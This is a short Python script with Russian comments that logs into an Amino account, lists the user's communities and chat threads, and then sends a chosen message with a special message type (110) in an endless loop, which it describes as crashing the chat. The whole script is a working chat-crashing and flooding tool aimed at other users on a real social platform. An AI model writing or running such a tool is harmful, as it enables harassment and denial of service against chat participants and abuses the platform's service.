#-*-coding:utf-8-*-
import amino # это называется импортированием библиотеки 
client = amino.Client() # это создание клиента в амино
email=input("Почта от аккаунта:") #
password=input("Пароль от аккаунта:") #
client = amino.Client()  #
client.login(email=email, password=password)
print('\nВхожу в систему')
for name, id in zip(client.sub_clients().name, client.sub_clients().comId): # тут я перебираю файлы в приложении дабы приконектиться к нему и найти то что мне надо, а имено саб клиент и просто клиент 
    print(f"{name}: {id}")
comid = input("Выберите id сообщества: ")
sub_client = amino.SubClient(comId=comid,profile=client.profile)
print('\nБот ищет чат айди')

chatInfo = sub_client.get_chat_threads(size=1000)
for title, chatId in zip(chatInfo.title, chatInfo.chatId):
	print(f"{title}: {chatId}")

chatid=input("Введите чат айди:")
message=str(input("Введите сообщение для краша. Лимит 2000"))
print("Bot Starting Crashing Chat/Бот начал крашить чат")
while True:
	try:
		sub_client.send_message(message=message, chatId=chatid, messageType=110)
	except:
		print("Сообщение не отправлено")
